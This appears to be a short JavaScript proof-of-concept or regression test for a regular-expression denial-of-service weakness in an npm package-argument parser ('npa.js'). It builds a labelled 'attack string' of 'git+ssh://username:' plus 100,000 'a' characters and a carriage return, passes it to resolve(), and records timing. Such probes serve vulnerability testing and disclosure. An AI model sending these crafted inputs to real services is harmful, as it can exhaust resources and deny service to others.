const { resolve } = require("./npa.js");

//Attack String :"git+ssh://username:"+"a"*100000+"\r"
var str = "git+ssh://username:";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += "\r";

console.log(resolve("", str, "", ""));

// real    0m0.272s
// user    0m0.187s
// sys     0m0.009s
